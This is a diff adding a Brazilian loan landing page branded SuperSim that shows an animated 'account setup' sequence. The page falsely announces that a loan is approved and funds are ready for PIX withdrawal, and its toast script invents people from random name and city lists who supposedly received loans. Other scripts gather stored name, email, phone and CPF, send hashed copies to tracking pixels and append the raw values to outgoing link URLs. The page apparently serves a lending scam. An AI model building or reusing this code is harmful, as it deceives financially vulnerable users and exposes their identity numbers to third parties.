@@ -1,0 +1,533 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+<script>
+!function (w, d, t) {
+  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script");n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
+
+  ttq.load('D8K3BJ3C77UDG683OUJ0');
+  ttq.load('D9D5FKRC77U6Q0JCMOC0');
+  ttq.page();
+}(window, document, 'ttq');
+</script>
+<script>
+(function () {
+  if (!window.ttq) return;
+  async function sha256Hex(str) {
+    const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(str));
+    return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, '0')).join('');
+  }
+  async function syncIdentify() {
+    const email = localStorage.getItem('email');
+    const phoneRaw = localStorage.getItem('telephone') || localStorage.getItem('telefone');
+    const cpf = localStorage.getItem('cpf');
+    const identify = {};
+    if (email) identify.email = await sha256Hex(email.trim().toLowerCase());
+    if (phoneRaw) {
+      const digits = phoneRaw.replace(/\D/g, '');
+      const e164 = '+' + (digits.startsWith('55') ? digits : '55' + digits);
+      identify.phone_number = await sha256Hex(e164);
+    }
+    if (cpf) identify.external_id = await sha256Hex(cpf.replace(/\D/g, ''));
+    if (Object.keys(identify).length) ttq.identify(identify);
+  }
+  syncIdentify();
+})();
+</script>
+<script src="https://cdn.jsdelivr.net/gh/xTracky/static@latest/utm-handler.js" data-token="0d20aaf6-5daf-401d-91a2-9c4f0868b186" data-step-id="criando-conta" async></script>
+
+
+
+
+
+<script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "xnzm2z9bd6");
+</script>
+
+<meta content="text/html;charset=utf-8" 
+
+
+<meta charset="utf-8">
+<meta content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" name="viewport">
+<title>SuperSim — Configurando sua conta</title>
+<link href="https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,400;9..40,500;9..40,600;9..40,700&family=Outfit:wght@400;500;600;700;800&family=Sora:wght@600;700;800&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    html,
+    body {
+      height: 100%;
+      width: 100%;
+      overflow: hidden;
+    }
+
+    body {
+      font-family: 'DM Sans', sans-serif;
+      background: linear-gradient(160deg, #FB9637 0%, #E8850A 40%, #B45309 70%, #92400E 100%);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: fixed;
+      inset: 0;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    /* Decorative blobs */
+    body::before {
+      content: '';
+      position: absolute;
+      top: -120px;
+      right: -80px;
+      width: 320px;
+      height: 320px;
+      background: radial-gradient(circle, rgba(255, 255, 255, .1) 0%, transparent 70%);
+      pointer-events: none;
+    }
+
+    body::after {
+      content: '';
+      position: absolute;
+      bottom: -100px;
+      left: -60px;
+      width: 260px;
+      height: 260px;
+      background: radial-gradient(circle, rgba(255, 255, 255, .07) 0%, transparent 70%);
+      pointer-events: none;
+    }
+
+    .container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+      padding: 40px 30px;
+      max-width: 380px;
+      width: 100%;
+      position: relative;
+      z-index: 1;
+    }
+
+    /* ===== LOGO ===== */
+    .logo {
+      margin-bottom: 8px;
+      animation: fadeDown .6s ease;
+    }
+
+    .logo-row {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .logo .la {
+      font-family: 'Sora', sans-serif;
+      font-weight: 800;
+      font-size: 32px;
+      color: white;
+      letter-spacing: -.5px;
+      line-height: 1;
+    }
+
+    .logo .lc {
+      font-family: 'Sora', sans-serif;
+      font-weight: 800;
+      font-size: 32px;
+      color: #FEF3C7;
+      letter-spacing: -.5px;
+      line-height: 1;
+    }
+
+    .logo-tag {
+      font-family: 'DM Sans', sans-serif;
+      font-weight: 600;
+      font-size: 9px;
+      letter-spacing: 3px;
+      text-transform: uppercase;
+      color: rgba(255, 255, 255, .5);
+      margin-top: 3px;
+    }
+
+    /* ===== GREETING ===== */
+    .greeting {
+      margin: 36px 0 6px;
+      animation: fadeDown .6s .3s ease both;
+    }
+
+    .greeting span {
+      font-size: 16px;
+      color: rgba(255, 255, 255, .7);
+    }
+
+    .greeting h1 {
+      font-family: 'Outfit', sans-serif;
+      font-size: 28px;
+      font-weight: 800;
+      color: white;
+      margin-top: 2px;
+    }
+
+    /* ===== SPINNER ===== */
+    .spinner-area {
+      margin: 40px 0 16px;
+      animation: fadeDown .6s .6s ease both;
+    }
+
+    .spinner {
+      width: 52px;
+      height: 52px;
+      border: 3.5px solid rgba(255, 255, 255, .2);
+      border-top: 3.5px solid white;
+      border-radius: 50%;
+      animation: spin .85s linear infinite;
+      margin: 0 auto;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    .status-text {
+      font-family: 'Outfit', sans-serif;
+      font-size: 18px;
+      font-weight: 600;
+      color: white;
+      margin-top: 18px;
+      animation: fadeDown .6s .8s ease both;
+    }
+
+    /* ===== CHECKLIST ===== */
+    .checklist {
+      margin-top: 32px;
+      display: flex;
+      flex-direction: column;
+      gap: 14px;
+      width: 100%;
+      max-width: 320px;
+    }
+
+    .check-item {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      opacity: 0;
+      transform: translateY(12px);
+      transition: all .5s cubic-bezier(.4, 0, .2, 1);
+    }
+
+    .check-item.show {
+      opacity: 1;
+      transform: translateY(0);
+    }
+
+    .check-icon {
+      width: 28px;
+      height: 28px;
+      border-radius: 50%;
+      flex-shrink: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: rgba(255, 255, 255, .15);
+      border: 2px solid rgba(255, 255, 255, .2);
+      transition: all .4s ease;
+    }
+
+    .check-item.show .check-icon {
+      background: rgba(255, 255, 255, .2);
+      border-color: rgba(255, 255, 255, .4);
+    }
+
+    .check-icon svg {
+      width: 14px;
+      height: 14px;
+      color: white;
+      stroke-width: 3;
+      opacity: 0;
+      transform: scale(.5);
+      transition: all .3s .1s ease;
+    }
+
+    .check-item.show .check-icon svg {
+      opacity: 1;
+      transform: scale(1);
+    }
+
+    .check-text {
+      font-size: 15px;
+      font-weight: 500;
+      color: rgba(255, 255, 255, .85);
+      text-align: left;
+    }
+
+    /* ===== PROGRESS BAR ===== */
+    .progress-wrap {
+      width: 100%;
+      max-width: 280px;
+      margin-top: 36px;
+      animation: fadeDown .6s 1s ease both;
+    }
+
+    .progress-bar {
+      width: 100%;
+      height: 4px;
+      background: rgba(255, 255, 255, .15);
+      border-radius: 4px;
+      overflow: hidden;
+    }
+
+    .progress-fill {
+      height: 100%;
+      width: 0%;
+      background: white;
+      border-radius: 4px;
+      transition: width .6s ease;
+    }
+
+    .progress-label {
+      font-size: 11px;
+      color: rgba(255, 255, 255, .45);
+      margin-top: 8px;
+    }
+
+    /* ===== FOOTER ===== */
+    .splash-foot {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      padding: 16px 20px env(safe-area-inset-bottom, 16px);
+      text-align: center;
+    }
+
+    .splash-foot p {
+      font-size: 10.5px;
+      color: rgba(255, 255, 255, .3);
+      line-height: 1.5;
+    }
+
+    /* ===== ANIMATIONS ===== */
+    @keyframes fadeDown {
+      from {
+        opacity: 0;
+        transform: translateY(-12px);
+      }
+
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+  </style>
+
+</head>
+<body>
+<div class="container">
+<!-- LOGO -->
+<div class="logo">
+<div class="logo-row"><img alt="SuperSim" src="images/supersim-logo.svg" style="height:38px;width:auto;"></div>
+</div>
+<!-- GREETING -->
+<div class="greeting">
+<span>Olá,</span>
+<h1 id="userName">Cliente</h1>
+</div>
+<!-- SPINNER -->
+<div class="spinner-area">
+<div class="spinner"></div>
+</div>
+<div class="status-text" id="statusText">Configurando sua conta</div>
+<!-- CHECKLIST -->
+<div class="checklist" id="checklist">
+<div class="check-item" id="step1">
+<div class="check-icon"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+<path d="M5 13l4 4L19 7" stroke-linecap="round" stroke-linejoin="round"></path>
+</svg></div>
+<span class="check-text">Conta criada com sucesso</span>
+</div>
+<div class="check-item" id="step2">
+<div class="check-icon"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+<path d="M5 13l4 4L19 7" stroke-linecap="round" stroke-linejoin="round"></path>
+</svg></div>
+<span class="check-text">Empréstimo aprovado e disponível</span>
+</div>
+<div class="check-item" id="step3">
+<div class="check-icon"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+<path d="M5 13l4 4L19 7" stroke-linecap="round" stroke-linejoin="round"></path>
+</svg></div>
+<span class="check-text">Saldo liberado para saque</span>
+</div>
+<div class="check-item" id="step4">
+<div class="check-icon"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+<path d="M5 13l4 4L19 7" stroke-linecap="round" stroke-linejoin="round"></path>
+</svg></div>
+<span class="check-text">PIX pronto para transferência</span>
+</div>
+</div>
+<!-- PROGRESS BAR -->
+<div class="progress-wrap">
+<div class="progress-bar">
+<div class="progress-fill" id="progFill"></div>
+</div>
+<div class="progress-label" id="progLabel">Preparando tudo para você...</div>
+</div>
+</div>
+<!-- FOOTER -->
+<div class="splash-foot">
+<p>SuperSim Soluções Financeiras S.A. — CNPJ 02.038.232/0001-64<br>Ambiente seguro com criptografia SSL</p>
+</div>
+<script>
+    // Load user name
+    const nome = localStorage.getItem('nome') || '';
+    if (nome) {
+      const primeiro = nome.trim().split(' ')[0];
+      document.getElementById('userName').textContent = primeiro;
+    }
+
+    const steps = ['step1', 'step2', 'step3', 'step4'];
+    const fill = document.getElementById('progFill');
+    const label = document.getElementById('progLabel');
+    const statusText = document.getElementById('statusText');
+
+    const messages = [
+      'Configurando sua conta',
+      'Verificando dados',
+      'Ativando empréstimo',
+      'Preparando ambiente',
+      'Quase pronto...'
+    ];
+
+    // Animate steps one by one
+    let current = 0;
+    function nextStep() {
+      if (current < steps.length) {
+        document.getElementById(steps[current]).classList.add('show');
+        fill.style.width = ((current + 1) / steps.length * 100) + '%';
+        if (current < messages.length) {
+          statusText.textContent = messages[current + 1] || messages[current];
+        }
+        current++;
+        setTimeout(nextStep, 1800);
+      } else {
+        // All done - redirect
+        label.textContent = 'Pronto! Redirecionando...';
+        statusText.textContent = 'Tudo pronto!';
+        try {
+          if (window.ttq) ttq.track('CompleteRegistration');
+        } catch (e) {}
+        setTimeout(() => {
+          const p = new URLSearchParams(window.location.search);
+          window.location.href = '../conta/index.html' + (p.toString() ? '?' + p : '');
+        }, 1200);
+      }
+    }
+
+    // Start after initial animations
+    setTimeout(nextStep, 1800);
+  </script>
+<script crossorigin="anonymous" data-cf-beacon="{" version":"2024.11.0","token":"291788ee003a413395b0add202b81cef","r":1,"server_timing":{"name":{"cfcachestatus":true,"cfedge":true,"cfextpri":true,"cfl4":true,"cforigin":true,"cfspeedbrain":true},"location_startswith":null}}"="" defer="" src="v8c78df7c7c0f484497ecbca7046644da1771523124516-8"></script>
+
+<script>
+  // UTM and Checkout Prefill
+  document.addEventListener("DOMContentLoaded", function() {
+    const urlParams = new URLSearchParams(window.location.search);
+    
+    // Check localStorage for checkout prefill data
+    const userMap = {
+      'name': ['nome', 'name'],
+      'email': ['email'],
+      'document': ['cpf', 'document'],
+      'phone': ['telefone', 'telephone', 'phone']
+    };
+    
+    for (const targetKey in userMap) {
+      if (!urlParams.has(targetKey) || !urlParams.get(targetKey)) {
+        for (const localKey of userMap[targetKey]) {
+          const localVal = localStorage.getItem(localKey);
+          if (localVal) {
+            let val = localVal;
+            if (targetKey === 'document' || targetKey === 'phone') {
+              val = val.replace(/\D/g, ''); // Keep only numbers for CPF/Phone
+            }
+            urlParams.set(targetKey, val);
+            break;
+          }
+        }
+      }
+    }
+    
+    const searchString = urlParams.toString();
+    if (searchString) {
+      const links = document.querySelectorAll("a");
+      links.forEach(function(link) {
+        let href = link.getAttribute("href");
+        if (href && !href.startsWith("#") && !href.startsWith("javascript")) {
+          // Exclude if it already has these parameters to avoid duplicates
+          if (!href.includes("name=") && !href.includes("document=")) {
+            const separator = href.includes("?") ? "&" : "?";
+            link.setAttribute("href", href + separator + searchString);
+          }
+        }
+      });
+    }
+  });
+</script>
+
+
+
+<script>
+(function () {
+  const style = document.createElement('style');
+  style.textContent = `
+    .sp-toast{position:fixed;top:max(42px,calc(env(safe-area-inset-top) + 200px));right:10px;max-width:min(240px,calc(100vw - 20px));background:rgba(255,255,255,.97);backdrop-filter:blur(40px) saturate(200%);-webkit-backdrop-filter:blur(40px) saturate(200%);border-radius:12px;padding:9px 11px;box-shadow:0 2px 4px rgba(0,0,0,.04),0 8px 24px rgba(0,0,0,.08),0 20px 48px rgba(0,0,0,.06);border:.5px solid rgba(0,0,0,.05);display:flex;align-items:center;gap:8px;z-index:99998;transform:translateX(120%) scale(.92);opacity:0;transition:all .45s cubic-bezier(.23,1,.32,1);pointer-events:none}
+    .sp-toast.show{transform:translateX(0) scale(1);opacity:1}
+    .sp-toast.hide{transform:translateX(120%) scale(.92);opacity:0;transition:all .3s cubic-bezier(.55,0,1,.45)}
+    .sp-ico{width:30px;height:30px;min-width:30px;border-radius:50%;object-fit:cover}
+    .sp-text{font-size:12px;color:#444;line-height:1.3;font-family:-apple-system,BlinkMacSystemFont,'SF Pro Text','Helvetica Neue',sans-serif}
+    .sp-text b{color:#111;font-weight:700}
+  `;
+  document.head.appendChild(style);
+
+  const toast = document.createElement('div');
+  toast.className = 'sp-toast';
+  toast.innerHTML = `
+    <img alt="" class="sp-ico" src="/2/images/supericon.png">
+    <div class="sp-text"><b class="sp-name">José Silva</b> de <span class="sp-city">São Paulo</span> conseguiu <b class="sp-amount">R$ 4.000</b></div>
+  `;
+  document.body.appendChild(toast);
+
+  const elName = toast.querySelector('.sp-name');
+  const elCity = toast.querySelector('.sp-city');
+  const elAmount = toast.querySelector('.sp-amount');
+
+  const firstNames = ['José', 'João', 'Carlos', 'Pedro', 'Lucas', 'Marcos', 'Rafael', 'Bruno', 'Felipe', 'Gabriel', 'Mariana', 'Ana', 'Fernanda', 'Juliana', 'Camila', 'Patrícia', 'Aline', 'Renata', 'Beatriz', 'Larissa'];
+  const lastNames = ['Silva', 'Souza', 'Oliveira', 'Santos', 'Pereira', 'Costa', 'Rodrigues', 'Almeida', 'Nascimento', 'Carvalho', 'Gomes', 'Martins', 'Araújo', 'Melo', 'Barbosa'];
+  const cities = ['São Paulo', 'Rio de Janeiro', 'Belo Horizonte', 'Curitiba', 'Porto Alegre', 'Salvador', 'Fortaleza', 'Recife', 'Brasília', 'Campinas', 'Goiânia', 'Manaus', 'Belém', 'Florianópolis', 'Natal'];
+  const pick = arr => arr[Math.floor(Math.random() * arr.length)];
+
+  function showSocialProof() {
+    elName.textContent = `${pick(firstNames)} ${pick(lastNames)}`;
+    elCity.textContent = pick(cities);
+    const amount = Math.floor(Math.random() * 41) * 50 + 3000;
+    elAmount.textContent = 'R$ ' + amount.toLocaleString('pt-BR');
+    toast.classList.remove('hide');
+    toast.classList.add('show');
+    setTimeout(() => { toast.classList.remove('show'); toast.classList.add('hide'); }, 5000);
+  }
+
+  function scheduleNext() {
+    const gap = 10000 + Math.random() * 10000;
+    setTimeout(() => { showSocialProof(); scheduleNext(); }, 5000 + gap);
+  }
+
+  setTimeout(() => { showSocialProof(); scheduleNext(); }, 8000);
+})();
+</script>
+</body></html>
